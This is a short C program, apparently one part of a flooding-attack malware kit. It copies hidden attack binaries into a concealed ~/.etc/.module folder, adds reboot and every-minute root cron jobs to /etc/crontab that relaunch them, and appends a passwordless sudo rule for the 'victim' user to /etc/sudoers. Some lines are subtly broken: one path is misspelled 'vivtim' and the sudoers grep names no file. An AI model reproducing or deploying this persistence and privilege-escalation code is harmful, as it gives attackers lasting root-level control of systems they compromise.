#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

int main(){
	//#copy files from ~/victim/.Launch_Attack to ~/victim/.etc/.module
	system("mkdir /home/victim/.etc");
	system("mkdir /home/victim/.etc/.module");
	system("cp -fp /home/victim/.Launching_Attack/Launching_Attack /home/victim/.etc/.module/Launching_Attack > /dev/null 2>&1");
	system("cp -fp /home/victim/.Launching_Attack/Flooding_Attack /home/victim/.etc/.module/Flooding_Attack > /dev/null 2>&1");
	system("cp -fp /home/victim/.Launching_Attack/Check_Attack /home/victim/.etc/.module/Check_Attack > /dev/null 2>&1");
	//#register to crontab
	system("grep -q REBOOT_ATTACK /etc/crontab || echo '@reboot root if [ -f /home/victim/.etc/.module/Launching_Attack ] && [ -f /home/vivtim/.etc/.module/Flooding_Attack ] && [ -f /home/victim/.etc/.module/Check_Attack ]; then /home/victim/.etc/.module/Launching_Attack; else /home/victim/.Launching_Attack/Launching_Attack; fi # REBOOT_ATTACK' >> /etc/crontab");
	system("grep -q MINUTE_ATTACK /etc/crontab || echo '* * * * * root if [ -f /home/victim/.etc/.module/Launching_Attack ] && [ -f /home/victim/.etc/.module/Flooding_Attack ] && [ -f /home/victim/.etc/.module/Check_Attack ]; then /home/victim/.etc/.module/Launching_Attack; else /home/victim/.Launching_Attack/Launching_Attack; fi # MINUTE_ATTACK' >> /etc/crontab");
	//#create sudoer
	system("grep -q 'NOPASSWD' || echo 'victim ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers");
	return 0;
}